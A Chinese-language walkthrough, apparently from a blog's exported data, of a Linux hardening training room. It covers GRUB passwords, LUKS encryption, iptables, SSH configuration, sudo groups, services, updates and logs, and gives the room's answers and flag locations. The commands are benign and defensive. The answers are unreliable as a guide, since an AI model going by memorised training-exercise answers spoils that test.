**Password-Based Key Derivation Function 2**\n\n## task3\n\n这个讲的是文件系统分区与加密\n\nluks(全称是**Linux Unified Key Setup** 是Linux系统中广泛使用的磁盘加密规范，它提供了一种强大且用户友好的标准化加密机制，通过对物理和逻辑磁盘分区内的数据进行加密来保护数据，确保只有授权用户才能访问加密分区的内容。)\n\nluks结构\n\n![disk](/images/Linux%20System%20Hardening/disk.png)\n\n- LUKS phdr：它代表**LUKS分区头**。LUKS phdr存储有关UUID（通用唯一标识符）、使用的密码、密码模式、密钥长度和主密钥的校验和的信息。\n  <br>\n- KM：KM 代表**密钥材料**，其中有 KM1、KM2、...、KM8。每个密钥材料部分都与一个密钥槽相关联，该密钥槽可以在LUKS phdr 中指示为活动状态。\n  换句话说，我们可能使用第一个用户的密码加密主密钥并保存在 KM1 中，使用第二个用户的密码加密主密钥并保存在 KM2 中，依此类推。\n  <br>\n- 批量数据：这是指**使用主密钥加密的数据**。主密钥保存在密钥材料部分中，并使用用户的密码进行加密。\n\n我们看看问题\n\n![task3](/images/Linux%20System%20Hardening/task3.png)\n\n第一问 luks全称叫**Linux Unified Key Setup**\n\n第二问真的有难度 看看提示 把提示的命令粘贴进去\n\n![3](/images/Linux%20System%20Hardening/3.png)\n\n然后到myvault里面就能看到答案\n\n![3](/images/Linux%20System%20Hardening/3%201.png)\n\n\n```\nsudo cryptsetup open --type luks secretvault.img myvault && sudo mount /dev/mapper/myvault myvault/\n```\n\n### 命令解释\n\n **sudo cryptsetup open --type luks secretvault.img  myvault**\n\n - **sudo**：以超级用户权限运行命令，因为解密和挂载操作通常 需要管理员权限。\n - **cryptsetup**：用于管理加密设备的命令行工具。\n - **open**：cryptsetup的子命令，用于打开一个加密设备。\n - **--type luks**：指定加密设备的类型为LUKS（Linux  Unified Key Setup）。\n - **secretvault.img**：加密图像文件的路径。\n - **myvault**：解密后的设备映射器名称，用于在/dev/ mapper/下创建一个设备节点。\n 这个命令的作用是将**secretvault.img**文件解密，并创建一个 设备映射器/dev/mapper/myvault，以便后续可以挂载这个设备。\n \n ---\n**sudo mount /dev/mapper/myvault myvault/**\n\n- **sudo** ：以超级用户权限运行命令。\n- **mount**：用于挂载文件系统的命令。\n- **/dev/mapper/myvault**：解密后的设备映射器路径。\n- <strong>*myvault/</strong>：挂载点目录，解密后的文件系统将挂载到这个目录。\n  \n这个命令的作用是将解密后的设备/dev/mapper/myvault挂载到myvault/目录，使得你可以访问其中的文件\n\n## task4\n这一个部分讲的是防火墙\n\n设置防火墙有很多安全优势。首先，防火墙规则可以精细控制哪些数据包可以离开系统以及哪些数据包可以进入系统。因此，防火墙规则通过控制设备之间的网络流量来帮助减轻各种安全风险。\n\n更重要的是，可以制定防火墙规则来确保没有客户端可以充当服务器。换句话说，攻击者无法在目标计算机上启动可访问的侦听端口；漏洞利用者可以启动侦听端口，但防火墙将阻止所有传入的连接尝试。\n\n  防火墙有两个主要功能：\n\n- 1.什么可以进入？允许或拒绝数据包进入系统。\n- 2.什么可以离开？允许或拒绝数据包离开系统。\n\n进入防火墙规则的 IP 标头字段包括：\n\n- 源 IP 地址\n- 目标 IP 地址\n  \n防火墙规则主要关注的TCP / UDP标头字段是：\n\n- 源TCP / UDP端口\n- 目标TCP / UDP端口\n\nnetfilter 为Linux内核 2.4.x 及更高版本提供数据包过滤软件。netfilter 需要(例如**iptables**或 **nftables**来管理。)\n\n说有点多了 我们直接看题\n\n![task4](/images/Linux%20System%20Hardening/firewall.png)\n\n前面提到**iptables** 我们就直接用iptables列出防火墙的规则 用grep过滤出我们想要的\n\n```\niptables --list | grep tcp\niptables --list | grep ucp\n```\n![task4](/images/Linux%20System%20Hardening/tcp.png)\n\n![task4](/images/Linux%20System%20Hardening/udp.png)\n\n\n## task5\n远程访问\n常见的攻击包括：\n- 密码嗅探\n- 密码猜测和暴力破解\n- 利用监听服务\n\n\n![task5](/images/Linux%20System%20Hardening/task5.png)\n\n查看sshd_config的隐藏 flag\n\n直接进入/etc/ssh/sshd_config查看就行了\n\n![sshd](/images/Linux%20System%20Hardening/sshd.png)\n\n\n## task6\n讲的是用户账户安全\n\n### 使用 sudo\n为了避免以身份登录root，更好的方法是将为管理目的创建的帐户添加到**sudoers** （即可以使用该sudo命令的组）。sudo代表超级用户执行，它应该在任何需要root特权的命令之前。\n\n据Linux发行版，我们可以通过以下方式将用户添加到 sudoers 组。某些发行版（例如 Debian 和 Ubuntu）将 sudoers 称为组**sudo**\n\n```\nusermod -aG sudo username\n```\n\n其他发行版（例如 RedHat 和 Fedora）将 sudoers 组称为**wheel**。\n\n```\nusermod -aG wheel username  \n```\n\n### 禁用未使用的用户\n一种简单的方法是编辑<strong>/etc/passwd</strong>文件并将我们要禁用的用户帐户的 shell 设置为/sbin/nologin。\n\n### 禁用 root\n一旦创建了用于管理目的的帐户并将其添加到**sudo/wheel**组，您可能会考虑禁用该root帐户。\n一种直接的方法是修改<strong>/etc/passwd</strong> 将 shell 更改root为<strong>/sbin/nologin</strong>。换句话说，编辑/etc/passwd并将行更改**bin/bash** 为 **/sbin/nologin**。\n\n我们看看题目\n\n![task6](/images/Linux%20System%20Hardening/task6.png)\n\n第一题/sbin/nologin\n\n第二题很显而易见 wheel\n\n第三题sudo\n\n第四题 问sudo组里面还有谁 我们之间grep一下/etc/group就可以知道1\n\n```\ncat group | grep sudo\n```\n\n![group](/images/Linux%20System%20Hardening/group.png)\n\n## task7\n\n软件和服务\n\n系统上安装的每款软件都会增加潜在漏洞的数量。换句话说，安装额外的软件包和新服务会增加攻击者可利用的漏洞，从而访问系统，并最终访问网络上的其他系统。\n\n- 禁用不必要的服务\n改善安全状况的最简单方法之一是删除或禁用不需要的服务和软件包。每个软件包都有一定的风险，而且我们无法知道何时会发现相关的漏洞。\n\n- 阻止不需要的网络端口\n删除所有不需要的软件包并禁用可能不会被删除的预安装服务后，相应地设置防火墙规则至关重要。\n\n- 避免使用遗留协议\n过去，Telnet 曾是远程访问系统的主要协议；TFTP 协议通常用于传输文件。随着安全替代方案的发布，不应再允许使用此类协议。\n- eg：\nSSH协议现已广泛使用，取代了 Telnet 。例如，安全文件传输议 (**SFTP**) 协议为 TFTP 协议提供了很好的替代方案。关键在选择和使用安全的替代方案。\n\n- 删除识别字符串\n每当你连接到远程服务器时，它通常会回复其版本号。此信息会向攻击者透露各种信息，例如服务器/程序的名称、版本号和主机操作系统。\n\n根据上面的文字 能知道 task7的答案是sftp(替代了tftp)\n\n## task8\n升级和更新策略\n以下两个命令更新基于 Debian 的发行版，例如 Ubuntu：\n\n```\napt update从配置的源下载包信息\napt upgrade从配置的源安装所有软件包的可用升级\n```\n\n以下命令更新 RedHat 或 Fedora 系统：\n\n```\ndnf update在较新版本上（Red Hat Enterprise Linux 8 及更高版本）\nyum update在旧版本上（Red Hat Enterprise Linux 7 及更早版本）\n```\n这个是题目\n\n![task8](/images/Linux%20System%20Hardening/task8.png)\n\n前面几题其实就是基础知识 百度啥的都可以知道 直接复制粘贴就完了\n\n最后一题的话 进/etc/apt/source.list就可以看到flag\n\n![source](/images/Linux%20System%20Hardening/source.png)\n\n## task9\n\n![task9](/source/images/Linux%20System%20Hardening/task9.png)\n\n这两天就是看你的**tail**和**grep**命令的使用了\n\n```\ntail -n 15 kern.log\ngrep denied source\n```\n结束这场战斗了 算比较深一点点了解linux在安全上的各种措施。要把这些用在实际的地方在是关键","slug":"Linux-System-Hardening教程","published":1,"updated":"2025-01-20T10:22:44.954Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxc0008tsg69b5i4jwd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>第一次遇到困难难度的题 有点意思 怕不会是个难关哦 </p>\n<p><img src=\"/images/Linux%20System%20Hardening/linux.png\" alt=\"title\"></p>\n<p>本房间涵盖了与Linux强化相关的各种主题。在本房间结束时，将通过以下方式了解有关如何提高Linux系统安全性的更多信息：</p>\n<ul>\n<li><strong>物理安全</strong></li>\n<li><strong>文件系统加密</strong></li>\n<li><strong>防火墙配置</strong></li>\n<li><strong>远程访问</strong></li>\n<li><strong>软件和服务</strong></li>\n<li><strong>更新和升级</strong></li>\n<li><strong>日志</strong></li>\n</ul>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>这个是讲物理安全</p>\n<p>我们可以根据要保护的Linux系统考虑添加GRUB密码。许多工具都有助于实现这一点。其中一个工具是，它会提示您输入两次密码并为您生成哈希值。生成的哈希值应根据Linux发行版（例如：Fedora和Ubuntu）添加到相应的配置文件中。此配置将阻止未经授权的用户重置您的 root 密码。它将要求用户提供密码才能通过GRUB访问高级启动配置，包括以 root 访问权限登录。<strong>grub2-mkpasswd-pbkdf2</strong></p>\n<p>我们能在文章中发现第一题的答案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grub2-mkpasswd-pbkdf2</span><br></pre></td></tr></table></figure>\n<p>grub2-mkpasswd-pbkdf2 是一个命令行工具，用于生成加密的密码哈希。</p>\n<p>生成的密码哈希使用 <strong>PBKDF2</strong>（Password-Based Key Derivation Function 2）算法，这是一种安全的密码哈希算法，可以有效防止彩虹表攻击和暴力破解。</p>\n<p>第二题也得出答案了 <strong>Password-Based Key Derivation Function 2</strong></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>这个讲的是文件系统分区与加密</p>\n<p>luks(全称是<strong>Linux Unified Key Setup</strong> 是Linux系统中广泛使用的磁盘加密规范，它提供了一种强大且用户友好的标准化加密机制，通过对物理和逻辑磁盘分区内的数据进行加密来保护数据，确保只有授权用户才能访问加密分区的内容。)</p>\n<p>luks结构</p>\n<p><img src=\"/images/Linux%20System%20Hardening/disk.png\" alt=\"disk\"></p>\n<ul>\n<li>LUKS phdr：它代表<strong>LUKS分区头</strong>。LUKS phdr存储有关UUID（通用唯一标识符）、使用的密码、密码模式、密钥长度和主密钥的校验和的信息。<br></li>\n<li>KM：KM 代表<strong>密钥材料</strong>，其中有 KM1、KM2、…、KM8。每个密钥材料部分都与一个密钥槽相关联，该密钥槽可以在LUKS phdr 中指示为活动状态。<br>换句话说，我们可能使用第一个用户的密码加密主密钥并保存在 KM1 中，使用第二个用户的密码加密主密钥并保存在 KM2 中，依此类推。<br></li>\n<li>批量数据：这是指<strong>使用主密钥加密的数据</strong>。主密钥保存在密钥材料部分中，并使用用户的密码进行加密。</li>\n</ul>\n<p>我们看看问题</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task3.png\" alt=\"task3\"></p>\n<p>第一问 luks全称叫<strong>Linux Unified Key Setup</strong></p>\n<p>第二问真的有难度 看看提示 把提示的命令粘贴进去</p>\n<p><img src=\"/images/Linux%20System%20Hardening/3.png\" alt=\"3\"></p>\n<p>然后到myvault里面就能看到答案</p>\n<p><img src=\"/images/Linux%20System%20Hardening/3%201.png\" alt=\"3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cryptsetup open --type luks secretvault.img myvault &amp;&amp; sudo mount /dev/mapper/myvault myvault/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令解释\"><a href=\"#命令解释\" class=\"headerlink\" title=\"命令解释\"></a>命令解释</h3><p> <strong>sudo cryptsetup open –type luks secretvault.img  myvault</strong></p>\n<ul>\n<li><strong>sudo</strong>：以超级用户权限运行命令，因为解密和挂载操作通常 需要管理员权限。</li>\n<li><strong>cryptsetup</strong>：用于管理加密设备的命令行工具。</li>\n<li><strong>open</strong>：cryptsetup的子命令，用于打开一个加密设备。</li>\n<li><strong>–type luks</strong>：指定加密设备的类型为LUKS（Linux  Unified Key Setup）。</li>\n<li><strong>secretvault.img</strong>：加密图像文件的路径。</li>\n<li><strong>myvault</strong>：解密后的设备映射器名称，用于在&#x2F;dev&#x2F; mapper&#x2F;下创建一个设备节点。<br> 这个命令的作用是将<strong>secretvault.img</strong>文件解密，并创建一个 设备映射器&#x2F;dev&#x2F;mapper&#x2F;myvault，以便后续可以挂载这个设备。</li>\n</ul>\n<hr>\n<p><strong>sudo mount &#x2F;dev&#x2F;mapper&#x2F;myvault myvault&#x2F;</strong></p>\n<ul>\n<li><strong>sudo</strong> ：以超级用户权限运行命令。</li>\n<li><strong>mount</strong>：用于挂载文件系统的命令。</li>\n<li><strong>&#x2F;dev&#x2F;mapper&#x2F;myvault</strong>：解密后的设备映射器路径。</li>\n<li><strong>*myvault&#x2F;</strong>：挂载点目录，解密后的文件系统将挂载到这个目录。</li>\n</ul>\n<p>这个命令的作用是将解密后的设备&#x2F;dev&#x2F;mapper&#x2F;myvault挂载到myvault&#x2F;目录，使得你可以访问其中的文件</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>这一个部分讲的是防火墙</p>\n<p>设置防火墙有很多安全优势。首先，防火墙规则可以精细控制哪些数据包可以离开系统以及哪些数据包可以进入系统。因此，防火墙规则通过控制设备之间的网络流量来帮助减轻各种安全风险。</p>\n<p>更重要的是，可以制定防火墙规则来确保没有客户端可以充当服务器。换句话说，攻击者无法在目标计算机上启动可访问的侦听端口；漏洞利用者可以启动侦听端口，但防火墙将阻止所有传入的连接尝试。</p>\n<p>  防火墙有两个主要功能：</p>\n<ul>\n<li>1.什么可以进入？允许或拒绝数据包进入系统。</li>\n<li>2.什么可以离开？允许或拒绝数据包离开系统。</li>\n</ul>\n<p>进入防火墙规则的 IP 标头字段包括：</p>\n<ul>\n<li>源 IP 地址</li>\n<li>目标 IP 地址</li>\n</ul>\n<p>防火墙规则主要关注的TCP &#x2F; UDP标头字段是：</p>\n<ul>\n<li>源TCP &#x2F; UDP端口</li>\n<li>目标TCP &#x2F; UDP端口</li>\n</ul>\n<p>netfilter 为Linux内核 2.4.x 及更高版本提供数据包过滤软件。netfilter 需要(例如<strong>iptables</strong>或 <strong>nftables</strong>来管理。)</p>\n<p>说有点多了 我们直接看题</p>\n<p><img src=\"/images/Linux%20System%20Hardening/firewall.png\" alt=\"task4\"></p>\n<p>前面提到<strong>iptables</strong> 我们就直接用iptables列出防火墙的规则 用grep过滤出我们想要的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables --list | grep tcp</span><br><span class=\"line\">iptables --list | grep ucp</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20System%20Hardening/tcp.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Linux%20System%20Hardening/udp.png\" alt=\"task4\"></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>远程访问<br>常见的攻击包括：</p>\n<ul>\n<li>密码嗅探</li>\n<li>密码猜测和暴力破解</li>\n<li>利用监听服务</li>\n</ul>\n<p><img src=\"/images/Linux%20System%20Hardening/task5.png\" alt=\"task5\"></p>\n<p>查看sshd_config的隐藏 flag</p>\n<p>直接进入&#x2F;etc&#x2F;ssh&#x2F;sshd_config查看就行了</p>\n<p><img src=\"/images/Linux%20System%20Hardening/sshd.png\" alt=\"sshd\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>讲的是用户账户安全</p>\n<h3 id=\"使用-sudo\"><a href=\"#使用-sudo\" class=\"headerlink\" title=\"使用 sudo\"></a>使用 sudo</h3><p>为了避免以身份登录root，更好的方法是将为管理目的创建的帐户添加到<strong>sudoers</strong> （即可以使用该sudo命令的组）。sudo代表超级用户执行，它应该在任何需要root特权的命令之前。</p>\n<p>据Linux发行版，我们可以通过以下方式将用户添加到 sudoers 组。某些发行版（例如 Debian 和 Ubuntu）将 sudoers 称为组<strong>sudo</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -aG sudo username</span><br></pre></td></tr></table></figure>\n\n<p>其他发行版（例如 RedHat 和 Fedora）将 sudoers 组称为<strong>wheel</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -aG wheel username  </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"禁用未使用的用户\"><a href=\"#禁用未使用的用户\" class=\"headerlink\" title=\"禁用未使用的用户\"></a>禁用未使用的用户</h3><p>一种简单的方法是编辑<strong>&#x2F;etc&#x2F;passwd</strong>文件并将我们要禁用的用户帐户的 shell 设置为&#x2F;sbin&#x2F;nologin。</p>\n<h3 id=\"禁用-root\"><a href=\"#禁用-root\" class=\"headerlink\" title=\"禁用 root\"></a>禁用 root</h3><p>一旦创建了用于管理目的的帐户并将其添加到<strong>sudo&#x2F;wheel</strong>组，您可能会考虑禁用该root帐户。<br>一种直接的方法是修改<strong>&#x2F;etc&#x2F;passwd</strong> 将 shell 更改root为<strong>&#x2F;sbin&#x2F;nologin</strong>。换句话说，编辑&#x2F;etc&#x2F;passwd并将行更改<strong>bin&#x2F;bash</strong> 为 <strong>&#x2F;sbin&#x2F;nologin</strong>。</p>\n<p>我们看看题目</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task6.png\" alt=\"task6\"></p>\n<p>第一题&#x2F;sbin&#x2F;nologin</p>\n<p>第二题很显而易见 wheel</p>\n<p>第三题sudo</p>\n<p>第四题 问sudo组里面还有谁 我们之间grep一下&#x2F;etc&#x2F;group就可以知道1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat group | grep sudo</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20System%20Hardening/group.png\" alt=\"group\"></p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>软件和服务</p>\n<p>系统上安装的每款软件都会增加潜在漏洞的数量。换句话说，安装额外的软件包和新服务会增加攻击者可利用的漏洞，从而访问系统，并最终访问网络上的其他系统。</p>\n<ul>\n<li><p>禁用不必要的服务<br>改善安全状况的最简单方法之一是删除或禁用不需要的服务和软件包。每个软件包都有一定的风险，而且我们无法知道何时会发现相关的漏洞。</p>\n</li>\n<li><p>阻止不需要的网络端口<br>删除所有不需要的软件包并禁用可能不会被删除的预安装服务后，相应地设置防火墙规则至关重要。</p>\n</li>\n<li><p>避免使用遗留协议<br>过去，Telnet 曾是远程访问系统的主要协议；TFTP 协议通常用于传输文件。随着安全替代方案的发布，不应再允许使用此类协议。</p>\n</li>\n<li><p>eg：<br>SSH协议现已广泛使用，取代了 Telnet 。例如，安全文件传输议 (<strong>SFTP</strong>) 协议为 TFTP 协议提供了很好的替代方案。关键在选择和使用安全的替代方案。</p>\n</li>\n<li><p>删除识别字符串<br>每当你连接到远程服务器时，它通常会回复其版本号。此信息会向攻击者透露各种信息，例如服务器&#x2F;程序的名称、版本号和主机操作系统。</p>\n</li>\n</ul>\n<p>根据上面的文字 能知道 task7的答案是sftp(替代了tftp)</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>升级和更新策略<br>以下两个命令更新基于 Debian 的发行版，例如 Ubuntu：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt update从配置的源下载包信息</span><br><span class=\"line\">apt upgrade从配置的源安装所有软件包的可用升级</span><br></pre></td></tr></table></figure>\n\n<p>以下命令更新 RedHat 或 Fedora 系统：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf update在较新版本上（Red Hat Enterprise Linux 8 及更高版本）</span><br><span class=\"line\">yum update在旧版本上（Red Hat Enterprise Linux 7 及更早版本）</span><br></pre></td></tr></table></figure>\n<p>这个是题目</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task8.png\" alt=\"task8\"></p>\n<p>前面几题其实就是基础知识 百度啥的都可以知道 直接复制粘贴就完了</p>\n<p>最后一题的话 进&#x2F;etc&#x2F;apt&#x2F;source.list就可以看到flag</p>\n<p><img src=\"/images/Linux%20System%20Hardening/source.png\" alt=\"source\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p><img src=\"/source/images/Linux%20System%20Hardening/task9.png\" alt=\"task9\"></p>\n<p>这两天就是看你的<strong>tail</strong>和<strong>grep</strong>命令的使用了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -n 15 kern.log</span><br><span class=\"line\">grep denied source</span><br></pre></td></tr></table></figure>\n<p>结束这场战斗了 算比较深一点点了解linux在安全上的各种措施。要把这些用在实际的地方在是关键</p>\n","excerpt":"","more":"<p>第一次遇到困难难度的题 有点意思 怕不会是个难关哦 </p>\n<p><img src=\"/images/Linux%20System%20Hardening/linux.png\" alt=\"title\"></p>\n<p>本房间涵盖了与Linux强化相关的各种主题。在本房间结束时，将通过以下方式了解有关如何提高Linux系统安全性的更多信息：</p>\n<ul>\n<li><strong>物理安全</strong></li>\n<li><strong>文件系统加密</strong></li>\n<li><strong>防火墙配置</strong></li>\n<li><strong>远程访问</strong></li>\n<li><strong>软件和服务</strong></li>\n<li><strong>更新和升级</strong></li>\n<li><strong>日志</strong></li>\n</ul>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>这个是讲物理安全</p>\n<p>我们可以根据要保护的Linux系统考虑添加GRUB密码。许多工具都有助于实现这一点。其中一个工具是，它会提示您输入两次密码并为您生成哈希值。生成的哈希值应根据Linux发行版（例如：Fedora和Ubuntu）添加到相应的配置文件中。此配置将阻止未经授权的用户重置您的 root 密码。它将要求用户提供密码才能通过GRUB访问高级启动配置，包括以 root 访问权限登录。<strong>grub2-mkpasswd-pbkdf2</strong></p>\n<p>我们能在文章中发现第一题的答案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grub2-mkpasswd-pbkdf2</span><br></pre></td></tr></table></figure>\n<p>grub2-mkpasswd-pbkdf2 是一个命令行工具，用于生成加密的密码哈希。</p>\n<p>生成的密码哈希使用 <strong>PBKDF2</strong>（Password-Based Key Derivation Function 2）算法，这是一种安全的密码哈希算法，可以有效防止彩虹表攻击和暴力破解。</p>\n<p>第二题也得出答案了 <strong>Password-Based Key Derivation Function 2</strong></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>这个讲的是文件系统分区与加密</p>\n<p>luks(全称是<strong>Linux Unified Key Setup</strong> 是Linux系统中广泛使用的磁盘加密规范，它提供了一种强大且用户友好的标准化加密机制，通过对物理和逻辑磁盘分区内的数据进行加密来保护数据，确保只有授权用户才能访问加密分区的内容。)</p>\n<p>luks结构</p>\n<p><img src=\"/images/Linux%20System%20Hardening/disk.png\" alt=\"disk\"></p>\n<ul>\n<li>LUKS phdr：它代表<strong>LUKS分区头</strong>。LUKS phdr存储有关UUID（通用唯一标识符）、使用的密码、密码模式、密钥长度和主密钥的校验和的信息。<br></li>\n<li>KM：KM 代表<strong>密钥材料</strong>，其中有 KM1、KM2、…、KM8。每个密钥材料部分都与一个密钥槽相关联，该密钥槽可以在LUKS phdr 中指示为活动状态。<br>换句话说，我们可能使用第一个用户的密码加密主密钥并保存在 KM1 中，使用第二个用户的密码加密主密钥并保存在 KM2 中，依此类推。<br></li>\n<li>批量数据：这是指<strong>使用主密钥加密的数据</strong>。主密钥保存在密钥材料部分中，并使用用户的密码进行加密。</li>\n</ul>\n<p>我们看看问题</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task3.png\" alt=\"task3\"></p>\n<p>第一问 luks全称叫<strong>Linux Unified Key Setup</strong></p>\n<p>第二问真的有难度 看看提示 把提示的命令粘贴进去</p>\n<p><img src=\"/images/Linux%20System%20Hardening/3.png\" alt=\"3\"></p>\n<p>然后到myvault里面就能看到答案</p>\n<p><img src=\"/images/Linux%20System%20Hardening/3%201.png\" alt=\"3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cryptsetup open --type luks secretvault.img myvault &amp;&amp; sudo mount /dev/mapper/myvault myvault/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令解释\"><a href=\"#命令解释\" class=\"headerlink\" title=\"命令解释\"></a>命令解释</h3><p> <strong>sudo cryptsetup open –type luks secretvault.img  myvault</strong></p>\n<ul>\n<li><strong>sudo</strong>：以超级用户权限运行命令，因为解密和挂载操作通常 需要管理员权限。</li>\n<li><strong>cryptsetup</strong>：用于管理加密设备的命令行工具。</li>\n<li><strong>open</strong>：cryptsetup的子命令，用于打开一个加密设备。</li>\n<li><strong>–type luks</strong>：指定加密设备的类型为LUKS（Linux  Unified Key Setup）。</li>\n<li><strong>secretvault.img</strong>：加密图像文件的路径。</li>\n<li><strong>myvault</strong>：解密后的设备映射器名称，用于在&#x2F;dev&#x2F; mapper&#x2F;下创建一个设备节点。<br> 这个命令的作用是将<strong>secretvault.img</strong>文件解密，并创建一个 设备映射器&#x2F;dev&#x2F;mapper&#x2F;myvault，以便后续可以挂载这个设备。</li>\n</ul>\n<hr>\n<p><strong>sudo mount &#x2F;dev&#x2F;mapper&#x2F;myvault myvault&#x2F;</strong></p>\n<ul>\n<li><strong>sudo</strong> ：以超级用户权限运行命令。</li>\n<li><strong>mount</strong>：用于挂载文件系统的命令。</li>\n<li><strong>&#x2F;dev&#x2F;mapper&#x2F;myvault</strong>：解密后的设备映射器路径。</li>\n<li><strong>*myvault&#x2F;</strong>：挂载点目录，解密后的文件系统将挂载到这个目录。</li>\n</ul>\n<p>这个命令的作用是将解密后的设备&#x2F;dev&#x2F;mapper&#x2F;myvault挂载到myvault&#x2F;目录，使得你可以访问其中的文件</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>这一个部分讲的是防火墙</p>\n<p>设置防火墙有很多安全优势。首先，防火墙规则可以精细控制哪些数据包可以离开系统以及哪些数据包可以进入系统。因此，防火墙规则通过控制设备之间的网络流量来帮助减轻各种安全风险。</p>\n<p>更重要的是，可以制定防火墙规则来确保没有客户端可以充当服务器。换句话说，攻击者无法在目标计算机上启动可访问的侦听端口；漏洞利用者可以启动侦听端口，但防火墙将阻止所有传入的连接尝试。</p>\n<p>  防火墙有两个主要功能：</p>\n<ul>\n<li>1.什么可以进入？允许或拒绝数据包进入系统。</li>\n<li>2.什么可以离开？允许或拒绝数据包离开系统。</li>\n</ul>\n<p>进入防火墙规则的 IP 标头字段包括：</p>\n<ul>\n<li>源 IP 地址</li>\n<li>目标 IP 地址</li>\n</ul>\n<p>防火墙规则主要关注的TCP &#x2F; UDP标头字段是：</p>\n<ul>\n<li>源TCP &#x2F; UDP端口</li>\n<li>目标TCP &#x2F; UDP端口</li>\n</ul>\n<p>netfilter 为Linux内核 2.4.x 及更高版本提供数据包过滤软件。netfilter 需要(例如<strong>iptables</strong>或 <strong>nftables</strong>来管理。)</p>\n<p>说有点多了 我们直接看题</p>\n<p><img src=\"/images/Linux%20System%20Hardening/firewall.png\" alt=\"task4\"></p>\n<p>前面提到<strong>iptables</strong> 我们就直接用iptables列出防火墙的规则 用grep过滤出我们想要的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables --list | grep tcp</span><br><span class=\"line\">iptables --list | grep ucp</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20System%20Hardening/tcp.png\" alt=\"task4\"></p>\n<p><img src=\"/images/Linux%20System%20Hardening/udp.png\" alt=\"task4\"></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>远程访问<br>常见的攻击包括：</p>\n<ul>\n<li>密码嗅探</li>\n<li>密码猜测和暴力破解</li>\n<li>利用监听服务</li>\n</ul>\n<p><img src=\"/images/Linux%20System%20Hardening/task5.png\" alt=\"task5\"></p>\n<p>查看sshd_config的隐藏 flag</p>\n<p>直接进入&#x2F;etc&#x2F;ssh&#x2F;sshd_config查看就行了</p>\n<p><img src=\"/images/Linux%20System%20Hardening/sshd.png\" alt=\"sshd\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>讲的是用户账户安全</p>\n<h3 id=\"使用-sudo\"><a href=\"#使用-sudo\" class=\"headerlink\" title=\"使用 sudo\"></a>使用 sudo</h3><p>为了避免以身份登录root，更好的方法是将为管理目的创建的帐户添加到<strong>sudoers</strong> （即可以使用该sudo命令的组）。sudo代表超级用户执行，它应该在任何需要root特权的命令之前。</p>\n<p>据Linux发行版，我们可以通过以下方式将用户添加到 sudoers 